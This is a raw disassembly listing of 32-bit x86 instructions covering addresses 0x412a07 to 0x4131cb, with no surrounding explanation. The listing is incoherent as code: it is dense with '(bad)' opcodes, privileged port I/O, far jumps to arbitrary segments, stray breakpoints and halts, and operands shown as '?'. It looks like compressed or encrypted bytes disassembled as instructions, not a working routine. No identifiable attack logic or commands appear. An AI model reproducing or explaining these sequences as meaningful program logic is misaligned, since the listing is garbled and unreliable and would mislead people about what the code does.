  412a07:	mov    dh,0xc6
  412a09:	add    cl,bl
  412a0b:	inc    esp
  412a0c:	sub    eax,0xe7d3e955
  412a11:	sti    
  412a12:	pop    ebx
  412a13:	inc    edx
  412a14:	inc    ebp
  412a15:	push   esp
  412a16:	cli    
  412a17:	dec    ebx
  412a18:	xor    bl,BYTE PTR [ecx+0x45c67ee6]
  412a1e:	sbb    eax,0xdd825abe
  412a23:	push   ss
  412a24:	sub    cl,BYTE PTR [ebx-0x2d8e4fa2]
  412a2a:	js     0x4129db
  412a2c:	pop    eax
  412a2d:	sbb    al,bh
  412a2f:	jbe    0x412a80
  412a31:	cmp    ebx,edi
  412a33:	push   esp
  412a34:	mov    ebx,0x4768a5b2
  412a39:	loop   0x412a60
  412a3b:	xchg   ebp,eax
  412a3c:	sar    DWORD PTR [ecx-0x5f1c2e25],1
  412a42:	loop   0x412a13
  412a44:	pop    eax
  412a45:	jl     0x4129d1
  412a47:	and    bl,BYTE PTR [edx]
  412a49:	aad    0xe
  412a4b:	mov    dl,0xd6
  412a4d:	dec    ebp
  412a4e:	jl     0x412a70
  412a50:	enter  0x5d10,0x2f
  412a54:	push   ds
  412a55:	cld    
  412a56:	xor    eax,0x246118a
  412a5b:	mov    esi,0x291357d
  412a60:	cld    
  412a61:	cmp    al,BYTE PTR [esi]
  412a63:	push   ecx
  412a64:	sbb    ch,ah
  412a66:	fcomp  QWORD PTR [ebx]
  412a68:	leave  
  412a69:	loopne 0x412a22
  412a6b:	cli    
  412a6c:	imul   DWORD PTR [ecx-0x2f]
  412a6f:	xchg   esi,eax
  412a70:	repnz cmp eax,0x8f1165a0
  412a76:	push   ds
  412a77:	into   
  412a78:	call   0x40aa:0x76bb0406
  412a7f:	popa   
  412a80:	sahf   
  412a81:	pop    es
  412a82:	jb     0x412a49
  412a84:	sub    eax,0xbaef108a
  412a89:	mul    DWORD PTR [edx-0x78]
  412a8c:	push   ebx
  412a8d:	or     edx,ebx
  412a8f:	std    
  412a90:	jno    0x412b05
  412a92:	mov    DWORD PTR [ebx],ecx
  412a94:	fwait
  412a95:	xor    eax,0x5a14c38a
  412a9a:	mov    ?,WORD PTR ds:0x21556b46
  412aa0:	cmp    DWORD PTR [eax],edi
  412aa2:	or     bh,ah
  412aa4:	push   esi
  412aa5:	xor    ebp,ecx
  412aa7:	jecxz  0x412b10
  412aa9:	lods   eax,DWORD PTR ds:[esi]
  412aaa:	mov    ds:0x7309d69d,eax
  412aaf:	aad    0xe9
  412ab1:	mov    esi,0x730acbff
  412ab6:	inc    esp
  412ab7:	std    
  412ab8:	pop    ebx
  412ab9:	in     eax,dx
  412aba:	push   0x43
  412abc:	xor    al,0x56
  412abe:	cmp    eax,ebp
  412ac0:	xor    al,0xb1
  412ac2:	xor    dl,BYTE PTR [ebx-0x63]
  412ac5:	jnp    0x412af5
  412ac7:	pop    ss
  412ac8:	pushf  
  412ac9:	dec    ebp
  412aca:	push   ebp
  412acb:	call   0xe4627606
  412ad0:	loop   0x412a88
  412ad2:	imul   ebx,DWORD PTR [ebx-0x7f],0xffffffd9
  412ad6:	mov    ecx,ebp
  412ad8:	mov    al,BYTE PTR [edx+edx*4+0x6]
  412adc:	mov    ecx,0x9fe6fe38
  412ae1:	pop    ss
  412ae2:	stos   DWORD PTR es:[edi],eax
  412ae3:	mov    al,ds:0xe18c1d8c
  412ae8:	stos   DWORD PTR es:[edi],eax
  412ae9:	arpl   WORD PTR [esi-0x14bc3d80],dx
  412aef:	or     eax,0x5caf6b53
  412af4:	push   edx
  412af5:	loope  0x412ab1
  412af7:	and    al,0xb2
  412af9:	push   esi
  412afa:	push   esp
  412afb:	repnz lea ecx,fs:[ecx+0x61630bd5]
  412b03:	sti    
  412b04:	aas    
  412b05:	mov    cl,0xc5
  412b07:	call   0xee3da1f7
  412b0c:	mov    al,0x88
  412b0e:	push   es
  412b0f:	mov    ebx,DWORD PTR [eax]
  412b11:	outs   dx,BYTE PTR ds:[esi]
  412b12:	pop    edi
  412b13:	xchg   edi,eax
  412b14:	dec    esp
  412b15:	xchg   edi,eax
  412b16:	fs adc eax,0xcf2fa0f5
  412b1c:	push   edx
  412b1d:	sbb    BYTE PTR [ebp-0x3b],ah
  412b20:	in     al,0x46
  412b22:	ins    DWORD PTR es:[edi],dx
  412b23:	push   ds
  412b24:	and    bh,0x3c
  412b27:	ja     0x412ad8
  412b29:	xor    al,0x38
  412b2b:	pop    esp
  412b2c:	out    0x11,eax
  412b2e:	push   0xd701c2d5
  412b33:	imul   esi,DWORD PTR [edi-0x1563caf7],0x3f
  412b3a:	fstp   QWORD PTR [esi-0x5e]
  412b3d:	dec    esi
  412b3e:	sub    al,0xdd
  412b40:	hlt    
  412b41:	imul   ecx,DWORD PTR [edi-0x6710b13b],0xffffffd9
  412b48:	outs   dx,DWORD PTR ds:[esi]
  412b49:	ror    BYTE PTR [ebp+0x6dcf923c],1
  412b4f:	scas   al,BYTE PTR es:[edi]
  412b50:	xchg   edi,eax
  412b51:	xchg   esi,eax
  412b52:	xchg   ecx,eax
  412b53:	shl    DWORD PTR [eax-0x36c7eaff],1
  412b59:	sub    dh,BYTE PTR [ebx-0x61a1eae7]
  412b5f:	sub    BYTE PTR [esi+0x49],al
  412b62:	pushf  
  412b63:	cdq    
  412b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b65:	jns    0x412bc6
  412b67:	ja     0x412aee
  412b69:	sub    eax,DWORD PTR [ebx-0x6a1d53c3]
  412b6f:	push   ebp
  412b70:	jl     0x412b8a
  412b72:	dec    edx
  412b73:	mov    esi,fs
  412b75:	and    edx,esp
  412b77:	push   ss
  412b78:	in     al,dx
  412b79:	(bad)  
  412b7a:	out    0xc6,eax
  412b7c:	ins    DWORD PTR es:[edi],dx
  412b7d:	les    esp,FWORD PTR [ebp*4+0xc712e46]
  412b84:	cwde   
  412b85:	xchg   edx,eax
  412b86:	inc    eax
  412b87:	les    esp,FWORD PTR [esi+0x75]
  412b8a:	sbb    DWORD PTR [eax-0x53],edi
  412b8d:	in     eax,0xb3
  412b8f:	jnp    0x412bcd
  412b91:	ins    DWORD PTR es:[edi],dx
  412b92:	shl    DWORD PTR [edi+edi*4],1
  412b95:	sar    bh,1
  412b97:	enter  0x6b43,0x8d
  412b9b:	cmp    al,0x28
  412b9d:	enter  0x32df,0x1c
  412ba1:	xchg   ebp,eax
  412ba2:	mov    al,0x58
  412ba4:	jecxz  0x412b28
  412ba6:	add    ecx,DWORD PTR [ebp+0x567c28dc]
  412bac:	mov    dl,0x1f
  412bae:	iret   
  412baf:	(bad)  
  412bb0:	add    esp,DWORD PTR [eax]
  412bb2:	subps  xmm2,XMMWORD PTR [esi+0x31]
  412bb6:	and    al,0x8b
  412bb8:	pop    DWORD PTR [edx-0x56]
  412bbb:	jge    0x412b8c
  412bbd:	cmp    eax,0x74a46b9e
  412bc2:	jle    0x412bf6
  412bc4:	xchg   ebp,eax
  412bc5:	adc    BYTE PTR [edx+0x34c4e67f],bl
  412bcb:	imul   esp,DWORD PTR [ebx],0xffffffa9
  412bce:	adc    DWORD PTR [ebp+0x5af46c44],0xb626f4be
  412bd8:	mov    DWORD PTR [edi+0x5],ecx
  412bdb:	cmp    al,0xc6
  412bdd:	xchg   esi,eax
  412bde:	jmp    ebx
  412be0:	adc    ch,ah
  412be2:	test   eax,0xdd2fa40a
  412be7:	sbb    DWORD PTR [ecx-0x4d],eax
  412bea:	or     al,0xc
  412bec:	push   ds
  412bed:	int3   
  412bee:	push   0xffffff89
  412bf0:	cmp    ch,dh
  412bf2:	pop    edi
  412bf3:	adc    eax,0x255979ae
  412bf8:	jae    0x412bf1
  412bfa:	jg     0x412c3b
  412bfc:	loop   0x412b7f
  412bfe:	mov    dl,al
  412c00:	sbb    ah,BYTE PTR [esi+0x32]
  412c03:	xchg   ebp,eax
  412c04:	pop    ebx
  412c05:	inc    eax
  412c06:	pop    es
  412c07:	mov    cl,dh
  412c09:	in     al,dx
  412c0a:	scas   eax,DWORD PTR es:[edi]
  412c0b:	nop
  412c0c:	sub    eax,0xce280b89
  412c11:	jmp    0x412c83
  412c13:	out    0xf3,al
  412c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c16:	push   ds
  412c17:	and    eax,DWORD PTR [edx+0x4ed08140]
  412c1d:	sub    edi,DWORD PTR [eax+0x2a]
  412c20:	xor    al,0x8f
  412c22:	retf   0x855a
  412c25:	ja     0x412c79
  412c27:	mov    ds:0x841ed595,al
  412c2c:	icebp  
  412c2d:	icebp  
  412c2e:	fimul  DWORD PTR [edx-0x74]
  412c31:	fst    DWORD PTR [edx]
  412c33:	bound  esp,QWORD PTR [esp+edx*1]
  412c36:	xchg   edi,eax
  412c37:	bound  edx,QWORD PTR [edx+eiz*1]
  412c3a:	mov    esi,esp
  412c3c:	in     al,0x7c
  412c3e:	dec    ebp
  412c3f:	mov    eax,ds:0xb99391ca
  412c44:	bound  edi,QWORD PTR [edx+0xa]
  412c47:	neg    BYTE PTR [eax-0xc]
  412c4a:	and    eax,DWORD PTR [bx+0x5f]
  412c4e:	aas    
  412c4f:	ja     0x412c5c
  412c51:	jns    0x412be2
  412c53:	(bad)  
  412c54:	pop    ecx
  412c55:	mov    ebx,0xeb2f25fd
  412c5a:	and    bl,BYTE PTR [esp+esi*4+0x5babd1b7]
  412c61:	cmp    DWORD PTR [ebx],0x32
  412c64:	call   0x33991175
  412c69:	arpl   si,bp
  412c6b:	mov    dh,0x8
  412c6d:	push   es
  412c6e:	add    dl,dl
  412c70:	scas   al,BYTE PTR es:[edi]
  412c71:	xor    eax,0x60490243
  412c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c77:	push   eax
  412c78:	mov    ch,0x29
  412c7a:	adc    dh,bl
  412c7c:	(bad)  [eax]
  412c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7f:	jmp    0xa3d2:0x25f2f03c
  412c86:	jmp    0x5b16:0x4b2461fe
  412c8d:	cmp    eax,0xd4c38c8b
  412c92:	pop    esi
  412c93:	dec    edi
  412c94:	push   ecx
  412c95:	in     al,0x13
  412c97:	pop    ebx
  412c98:	popf   
  412c99:	push   cs
  412c9a:	enter  0x81c8,0xe8
  412c9e:	xchg   edx,eax
  412c9f:	dec    eax
  412ca0:	jne    0x412c84
  412ca2:	jnp    0x412c3e
  412ca4:	mov    cl,cl
  412ca6:	popa   
  412ca7:	jae    0x412ce4
  412ca9:	test   BYTE PTR [edx],ah
  412cab:	popf   
  412cac:	mov    bh,0xb1
  412cae:	sbb    bh,BYTE PTR [ebx+esi*4-0x15]
  412cb2:	imul   edi,DWORD PTR [edx-0x72],0x74
  412cb6:	cld    
  412cb7:	outs   dx,DWORD PTR ds:[esi]
  412cb8:	xor    al,0x95
  412cba:	add    eax,0x36d8012c
  412cbf:	stos   BYTE PTR es:[edi],al
  412cc0:	jmp    0x3c7:0xb3e81f3d
  412cc7:	mov    gs,WORD PTR [ecx]
  412cc9:	jl     0x412c67
  412ccb:	pop    ds
  412ccc:	xchg   ecx,eax
  412ccd:	ret    0xe34a
  412cd0:	jnp    0x412cd7
  412cd2:	cwde   
  412cd3:	test   BYTE PTR ds:0x9d0cb2b0,dl
  412cd9:	and    DWORD PTR ss:[eax],ecx
  412cdc:	xchg   edx,eax
  412cdd:	sbb    BYTE PTR [edx+0x746da73b],bh
  412ce3:	(bad)  
  412ce4:	sub    dl,BYTE PTR [ebp-0x41d71ae7]
  412cea:	sub    ah,dh
  412cec:	pop    ss
  412ced:	or     bl,dh
  412cef:	cmc    
  412cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cf1:	pop    esp
  412cf2:	icebp  
  412cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf4:	xor    ebx,DWORD PTR [eax+edx*8]
  412cf7:	bound  esi,QWORD PTR [edi]
  412cf9:	fidiv  DWORD PTR [ebp+0x42]
  412cfc:	mov    edi,ebp
  412cfe:	xor    al,0xc8
  412d00:	push   esi
  412d01:	or     DWORD PTR [ecx-0xb885db0],ebp
  412d07:	test   eax,0xbd06c1d4
  412d0c:	and    DWORD PTR [edi-0x16],ecx
  412d0f:	sbb    esp,ebx
  412d11:	fsubr  QWORD PTR [edi+ebp*8]
  412d14:	inc    edx
  412d15:	or     esp,DWORD PTR [edi]
  412d17:	or     eax,0x64e12e25
  412d1c:	jp     0x412d97
  412d1e:	mov    eax,0x86003038
  412d23:	pop    esp
  412d25:	test   ch,0xa6
  412d28:	dec    ebx
  412d29:	or     bh,BYTE PTR [edi]
  412d2b:	add    ah,BYTE PTR [esi+0x20081b15]
  412d31:	mov    ebp,0x2de7d3c4
  412d37:	jne    0x412cc2
  412d39:	xchg   ecx,eax
  412d3a:	neg    DWORD PTR ds:0xcd916e36
  412d40:	loop   0x412d62
  412d42:	sar    BYTE PTR [edx],0xd2
  412d45:	fild   DWORD PTR [ebp+ebx*1-0x1c9397af]
  412d4c:	ds cmp ax,0x4ae8
  412d51:	xchg   ebp,eax
  412d52:	xchg   esi,eax
  412d53:	(bad)  
  412d54:	int3   
  412d55:	inc    eax
  412d56:	call   0xef1a259b
  412d5b:	add    eax,0xffffff89
  412d5e:	es ret 0xcd6a
  412d62:	cld    
  412d63:	push   eax
  412d64:	mov    ch,0xfd
  412d66:	sbb    al,0x64
  412d68:	pop    ss
  412d69:	rol    ch,cl
  412d6b:	inc    edi
  412d6c:	xchg   esp,eax
  412d6d:	jae    0x412dc0
  412d6f:	pop    edi
  412d70:	stc    
  412d71:	hlt    
  412d72:	cli    
  412d73:	dec    esp
  412d74:	push   ecx
  412d75:	sar    BYTE PTR [ecx-0x50a76303],0xb5
  412d7c:	or     BYTE PTR [ebx],0x4d
  412d7f:	fs xchg ebx,eax
  412d81:	rcl    bh,0xd4
  412d84:	jmp    0x51536311
  412d89:	add    al,0x2d
  412d8b:	push   edx
  412d8c:	lods   al,BYTE PTR ds:[esi]
  412d8d:	mov    ds:0x8108fc16,al
  412d92:	push   ss
  412d93:	mov    edx,0xab3acd10
  412d98:	aam    0x3d
  412d9a:	jno    0x412dff
  412d9c:	jae    0x412d42
  412d9e:	ins    DWORD PTR es:[edi],dx
  412d9f:	inc    ecx
  412da0:	dec    DWORD PTR [ebp+eiz*2-0x4d]
  412da4:	pop    esi
  412da5:	push   0x61
  412da7:	inc    edi
  412da8:	inc    edi
  412da9:	adc    eax,0x585d51f9
  412dae:	inc    edi
  412daf:	mov    ch,0x5b
  412db1:	fmul   DWORD PTR [edx+0x2e]
  412db4:	dec    ecx
  412db5:	icebp  
  412db6:	out    dx,eax
  412db7:	dec    ebp
  412db8:	jae    0x412dd5
  412dba:	or     al,0xd8
  412dbc:	hlt    
  412dbd:	ror    DWORD PTR [eax],cl
  412dbf:	cmp    al,0x90
  412dc1:	retf   0xcd37
  412dc4:	cld    
  412dc5:	(bad)  
  412dc6:	jno    0x412df6
  412dc8:	or     esi,edx
  412dca:	sar    BYTE PTR [edx],cl
  412dcc:	es pop ebp
  412dce:	dec    ecx
  412dcf:	mov    bh,BYTE PTR [edi]
  412dd1:	pop    ss
  412dd2:	sbb    DWORD PTR [eax+0x13],ebx
  412dd5:	mov    WORD PTR [edx],es
  412dd7:	das    
  412dd8:	push   esp
  412dd9:	mov    gs,eax
  412ddb:	pop    ebx
  412ddc:	inc    ebx
  412ddd:	call   0x64238fe5
  412de2:	fsubr  QWORD PTR [ebx]
  412de4:	mov    dh,0x10
  412de6:	add    bh,BYTE PTR [ebx-0xe]
  412de9:	push   edx
  412dea:	jmp    0x412ddc
  412dec:	mov    esi,0xb927eda7
  412df1:	sti    
  412df2:	xor    BYTE PTR [esp+esi*8+0x2e1c8277],0xb0
  412dfa:	or     al,0xcc
  412dfc:	(bad)
  412dff:	aaa    
  412e00:	mov    edx,0xae0c8b0d
  412e05:	out    dx,eax
  412e06:	dec    edi
  412e07:	sahf   
  412e08:	adc    al,0x4
  412e0a:	rcr    bh,cl
  412e0c:	stos   DWORD PTR es:[edi],eax
  412e0d:	mov    al,0x27
  412e0f:	ret    0x6d2f
  412e12:	fisttp DWORD PTR [eax]
  412e14:	hlt    
  412e15:	stc    
  412e16:	or     BYTE PTR [esi],al
  412e18:	out    dx,eax
  412e19:	mov    WORD PTR [ecx+0x63e04a8e],ds
  412e1f:	fisub  DWORD PTR [ebp+0x57]
  412e22:	pop    es
  412e23:	dec    edi
  412e24:	push   ecx
  412e25:	arpl   WORD PTR [eax+0x56],ax
  412e28:	mov    dl,BYTE PTR [esi-0x6695aa7e]
  412e2e:	jg     0x412e11
  412e30:	loop   0x412df7
  412e32:	stos   DWORD PTR es:[edi],eax
  412e33:	sub    BYTE PTR [esi-0x16],dh
  412e36:	inc    esp
  412e37:	sbb    al,0xca
  412e39:	mov    ds:0x8e56ef50,eax
  412e3e:	jb     0x412e84
  412e40:	rcl    DWORD PTR [ecx+0x192f1002],1
  412e46:	mov    esi,edi
  412e48:	xchg   ebx,eax
  412e49:	scas   eax,DWORD PTR es:[edi]
  412e4a:	dec    eax
  412e4b:	call   0x4db7:0xd4988cb5
  412e52:	sub    DWORD PTR [ebp-0x18713e0f],esi
  412e58:	ds push ebp
  412e5a:	(bad)  [ecx-0xc]
  412e5d:	sbb    DWORD PTR [ecx-0x6f],esi
  412e60:	mov    BYTE PTR [edx-0x75],ah
  412e63:	mov    cl,0x4f
  412e65:	int    0x0
  412e67:	add    eax,0x68b319fd
  412e6c:	fidiv  DWORD PTR [ebx+ebx*2-0x59bacee4]
  412e73:	ja     0x412e2e
  412e75:	xor    DWORD PTR [eax-0x5a],ebp
  412e78:	pop    ecx
  412e79:	mov    ebx,0x7cbd5e9f
  412e7e:	loope  0x412e14
  412e80:	js     0x412e64
  412e82:	mov    ah,0x56
  412e84:	adc    edx,DWORD PTR [ebx]
  412e86:	and    eax,0xf224621
  412e8b:	jge    0x412e83
  412e8d:	pop    ds
  412e8e:	idiv   edx
  412e90:	loop   0x412f00
  412e92:	mov    BYTE PTR ds:0x8218deef,cl
  412e98:	sbb    DWORD PTR [ecx],esi
  412e9a:	das    
  412e9b:	mov    ds:0x972aaab9,eax
  412ea0:	jb     0x412ed0
  412ea2:	lods   al,BYTE PTR ds:[esi]
  412ea3:	sub    BYTE PTR [edx+0x1fa58300],ch
  412ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eaa:	aaa    
  412eab:	mov    edi,DWORD PTR [edi+0x72]
  412eae:	pop    ebx
  412eaf:	adc    BYTE PTR [edx-0x299b0e7],al
  412eb5:	and    edi,DWORD PTR [eax-0x6d]
  412eb8:	cmp    BYTE PTR [edi],ch
  412eba:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  412ebc:	inc    edx
  412ebd:	mov    edi,0x1b8a5a86
  412ec2:	stos   BYTE PTR es:[edi],al
  412ec3:	mul    dl
  412ec5:	call   0x922b7ae
  412eca:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  412ecc:	add    BYTE PTR [eax-0x367d0dea],bh
  412ed2:	ins    DWORD PTR es:[edi],dx
  412ed3:	pop    ds
  412ed4:	fs sbb esp,esp
  412ed7:	(bad)  
  412ed8:	mov    al,ds:0x5f959ee6
  412edd:	sbb    DWORD PTR [eax-0x40a292bb],ebp
  412ee3:	push   es
  412ee4:	stos   BYTE PTR es:[edi],al
  412ee5:	and    DWORD PTR [esi-0x3f],ebx
  412ee8:	cmc    
  412ee9:	pop    esi
  412eea:	xchg   esp,eax
  412eeb:	dec    edi
  412eec:	inc    ebp
  412eed:	mov    ?,eax
  412eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef0:	test   al,0xae
  412ef2:	addr16 inc edi
  412ef4:	inc    esi
  412ef5:	sub    al,0xae
  412ef7:	jp     0x412e93
  412ef9:	add    DWORD PTR [eax-0x61],esp
  412efc:	rcr    BYTE PTR [edi],0x57
  412eff:	nop
  412f00:	xchg   edi,eax
  412f01:	jmp    0x65d9:0xec43aaf1
  412f08:	mov    ss,WORD PTR [edx-0xa]
  412f0b:	push   0xbdee6732
  412f10:	in     eax,0x89
  412f12:	xor    eax,0x47ccb4b1
  412f17:	(bad)  
  412f18:	adc    al,0x7d
  412f1a:	mov    dh,0x67
  412f1c:	retf   0xa9b3
  412f1f:	jle    0x412ed3
  412f21:	shl    BYTE PTR [ebx+0x6982d8dd],cl
  412f27:	int3   
  412f28:	mov    DWORD PTR [ebp+eiz*8+0x3af21d43],eax
  412f2f:	cli    
  412f30:	pop    es
  412f31:	cld    
  412f32:	imul   eax,DWORD PTR [esp+edx*2],0xfffffff8
  412f36:	fdiv   QWORD PTR [ecx-0x53c4ea73]
  412f3c:	sbb    eax,0x1b840009
  412f41:	lods   eax,DWORD PTR ds:[esi]
  412f42:	mov    esi,0xab00ab82
  412f47:	xchg   esp,eax
  412f48:	adc    al,0x85
  412f4a:	clc    
  412f4b:	xor    al,0x6c
  412f4d:	xlat   BYTE PTR ds:[ebx]
  412f4e:	arpl   ax,cx
  412f50:	popa   
  412f51:	aad    0x28
  412f53:	xor    eax,0x479de0e5
  412f58:	sub    ch,bh
  412f5a:	xlat   BYTE PTR ds:[ebx]
  412f5b:	cmp    BYTE PTR [eax+edx*1],dh
  412f5e:	mov    ds:0x4a4fd65b,eax
  412f63:	mov    esi,0xbdf3cf1e
  412f68:	out    0xb2,al
  412f6a:	push   edi
  412f6b:	(bad)  
  412f6c:	lods   al,BYTE PTR ds:[esi]
  412f6d:	fisttp DWORD PTR [eax-0x7dd0209a]
  412f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f74:	daa    
  412f75:	sbb    eax,0x522c0bf8
  412f7a:	ins    DWORD PTR es:[edi],dx
  412f7b:	jne    0x412f85
  412f7d:	inc    ecx
  412f7e:	retf   0x5b76
  412f81:	enter  0x23fa,0x31
  412f85:	cld    
  412f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f87:	iret   
  412f88:	sahf   
  412f89:	xor    eax,0x47b57ba1
  412f8e:	cmp    cl,BYTE PTR [esi+0x4c112b51]
  412f94:	dec    ecx
  412f95:	mov    eax,0x84b52792
  412f9a:	mov    DWORD PTR [ebp+0x45],0xb8d6c9ef
  412fa1:	ds jb  0x412fd7
  412fa4:	nop
  412fa5:	sub    ch,BYTE PTR [ebp+0x7ca775b5]
  412fab:	and    ebx,DWORD PTR [ecx-0x31]
  412fae:	mov    ds:0x6b8ede7b,al
  412fb3:	jno    0x412f78
  412fb5:	ret    
  412fb6:	imul   ebx,DWORD PTR [ecx],0x4d
  412fb9:	sbb    al,0xd7
  412fbb:	loope  0x413015
  412fbd:	mov    WORD PTR [edi-0x34],?
  412fc0:	imul   edx,DWORD PTR ds:0x267605b9,0xb7a9c7ae
  412fca:	mov    BYTE PTR [ebx+0xebdd2d],bh
  412fd0:	inc    edx
  412fd1:	mov    bl,0xa4
  412fd3:	jae    0x412fa1
  412fd5:	(bad)  
  412fd6:	in     eax,0xa4
  412fd8:	jmp    0xddba:0x51d58347
  412fdf:	psubw  mm3,QWORD PTR [edi-0x62909f3c]
  412fe6:	bnd addr16 jmp 0x412f83
  412fea:	xchg   ebp,eax
  412feb:	sbb    eax,0xf9d9aa3b
  412ff0:	pushw  es
  412ff2:	in     eax,dx
  412ff3:	sahf   
  412ff4:	into   
  412ff5:	add    al,BYTE PTR [ebx+0x3]
  412ff8:	sub    BYTE PTR [edx-0x229c634b],bl
  412ffe:	pop    ebp
  412fff:	imul   edx,DWORD PTR [eax-0x53357c47],0xfbe66ee0
  413009:	mov    bl,0xfa
  41300b:	sar    BYTE PTR [ebp+0x66ad9b24],1
  413011:	scas   eax,DWORD PTR es:[edi]
  413012:	inc    edx
  413013:	mov    ah,0xd8
  413015:	mov    ebp,0x7e93fafb
  41301a:	push   es
  41301b:	nop
  41301c:	xchg   edx,eax
  41301d:	jbe    0x412fbf
  41301f:	out    dx,al
  413020:	aas    
  413021:	push   0xffffff8d
  413023:	sbb    eax,DWORD PTR [eax+eiz*1-0x4602e917]
  41302a:	or     BYTE PTR [esi+0x35],ah
  41302d:	pop    ebp
  41302e:	mov    BYTE PTR [ebx+ecx*4-0x93bf08f],dl
  413035:	mov    dh,0x9b
  413037:	arpl   WORD PTR [edi+0x6f],cx
  41303a:	add    edx,esp
  41303c:	shl    BYTE PTR [ebx],1
  41303e:	jmp    0xd541:0x5dc45286
  413045:	test   al,0xfb
  413047:	mov    ah,0x3a
  413049:	mov    esi,0xbfcd58fb
  41304e:	nop
  41304f:	leave  
  413050:	leave  
  413051:	cld    
  413052:	xor    al,0xc8
  413054:	inc    edx
  413055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413056:	lea    eax,[edx]
  413058:	mov    esi,0xe227689
  41305d:	test   DWORD PTR [edx+0x1],0x52b2a43d
  413064:	aaa    
  413065:	gs nop
  413067:	push   eax
  413068:	add    eax,0xdd705c5d
  41306d:	sub    dl,BYTE PTR [ecx+0x78b389a1]
  413073:	test   eax,0xfde4d346
  413078:	pusha  
  413079:	xchg   edi,eax
  41307a:	shl    BYTE PTR [ebp-0x6f],cl
  41307d:	call   0xa68e:0xb254648f
  413084:	mov    WORD PTR [ebx-0x40],cs
  413087:	mov    dl,0x6b
  413089:	(bad)  
  41308a:	retf   
  41308b:	jmp    0x413013
  41308d:	loopne 0x413026
  41308f:	fcmove st,st(2)
  413091:	dec    edi
  413092:	shr    DWORD PTR [ebx+0x556720e5],0xf
  413099:	xor    eax,0xe2a3bd5c
  41309e:	pushf  
  41309f:	or     eax,0x601c3f5b
  4130a4:	jge    0x4130df
  4130a6:	sti    
  4130a7:	push   esp
  4130a8:	loopne 0x41305f
  4130aa:	nop
  4130ab:	or     eax,0x52fca723
  4130b0:	hlt    
  4130b1:	add    esp,ebx
  4130b3:	jae    0x4130d1
  4130b5:	rcl    DWORD PTR [edi+0x2785567c],0x51
  4130bc:	and    esi,DWORD PTR [ecx+0x63]
  4130bf:	scas   eax,DWORD PTR es:[edi]
  4130c0:	fadd   QWORD PTR [esi+ebx*8]
  4130c3:	mov    ch,0xe0
  4130c5:	pop    edx
  4130c6:	not    BYTE PTR [eax]
  4130c8:	jnp    0x413148
  4130ca:	call   0x4bd30ccd
  4130cf:	popa   
  4130d0:	pop    esp
  4130d1:	jb     0x4130db
  4130d3:	inc    ebx
  4130d4:	sub    edi,DWORD PTR [ebp-0x54958127]
  4130da:	or     ah,BYTE PTR [edx+0x39598a8c]
  4130e0:	jmp    0xbe8c:0x9395315
  4130e7:	int3   
  4130e8:	pop    ss
  4130e9:	push   edx
  4130ea:	push   es
  4130eb:	xor    DWORD PTR [ecx],ecx
  4130ed:	push   eax
  4130ee:	xor    eax,0x4068d058
  4130f3:	imul   eax,edx,0x40
  4130f6:	sbb    ah,BYTE PTR ds:0xc4924ea
  4130fc:	aas    
  4130fd:	inc    esi
  4130fe:	fwait
  4130ff:	cmp    eax,0xb949a2e
  413104:	push   ebx
  413105:	lods   eax,DWORD PTR ds:[esi]
  413106:	retf   0x8b4e
  413109:	mov    eax,DWORD PTR [esi+0x4f041fcd]
  41310f:	mov    ?,WORD PTR [edx]
  413111:	or     DWORD PTR [ecx*1+0x22b92512],0xffffff86
  413119:	(bad)  
  41311a:	loope  0x4130a8
  41311c:	(bad)  
  41311d:	ss pop ebp
  41311f:	dec    ecx
  413120:	aaa    
  413121:	mov    eax,0x503519b9
  413126:	mov    eax,ds:0x129c68f6
  41312b:	stc    
  41312c:	out    dx,eax
  41312d:	mov    ch,0x7a
  41312f:	daa    
  413130:	hlt    
  413131:	dec    ebx
  413132:	fdivr  QWORD PTR [ebp-0x5ffe5509]
  413138:	pop    esp
  413139:	cmp    DWORD PTR [ecx+edi*2],ebx
  41313c:	mov    BYTE PTR [edx-0x7dac654c],ch
  413142:	(bad)  
  413143:	into   
  413144:	or     BYTE PTR [ebp-0x7e],bh
  413147:	xchg   esi,eax
  413148:	(bad)  
  413149:	xchg   edx,eax
  41314a:	lods   eax,DWORD PTR ds:[esi]
  41314b:	fistp  DWORD PTR [edi+0x74fa9be4]
  413151:	cmp    BYTE PTR ds:0xdef61965,ch
  413157:	pop    edi
  413158:	fxrstor [edx+0x63f412c7]
  41315f:	mov    eax,ds:0x813917d4
  413164:	in     al,dx
  413165:	paddw  mm3,mm3
  413168:	mov    ah,0xcd
  41316a:	cli    
  41316b:	push   0x1a
  41316d:	mov    dh,0xa9
  41316f:	ss int 0xa4
  413172:	cdq    
  413173:	inc    eax
  413174:	sar    BYTE PTR [eax+0x34],cl
  413177:	out    0xdc,al
  413179:	stc    
  41317a:	jnp    0x413186
  41317c:	push   0xca4f7728
  413181:	sbb    eax,0x19032dbc
  413186:	dec    ecx
  413187:	push   0xdbdb9d6e
  41318c:	push   ss
  41318d:	lods   al,BYTE PTR ds:[esi]
  41318e:	test   eax,0x77ab3fde
  413193:	aaa    
  413194:	loop   0x41320a
  413196:	cmp    edi,DWORD PTR [ecx-0x5af1ce8c]
  41319c:	pop    edi
  41319d:	sbb    bh,BYTE PTR [edx+0xf]
  4131a0:	sub    eax,0xc4a6a4ff
  4131a5:	inc    edx
  4131a6:	xchg   esp,eax
  4131a7:	add    dh,BYTE PTR [edi-0x3b2cbeb8]
  4131ad:	rol    ah,1
  4131af:	leave  
  4131b0:	or     eax,0x988459b7
  4131b5:	adc    eax,0x3a57bbc3
  4131ba:	fld    TBYTE PTR [ebp*1+0x7a9c1948]
  4131c1:	inc    esp
  4131c2:	retf   0x3558
  4131c5:	fwait
  4131c6:	cli    
  4131c7:	aam    0xed
  4131c9:	in     eax,0x3
  4131cb:	xchg   ebx,eax
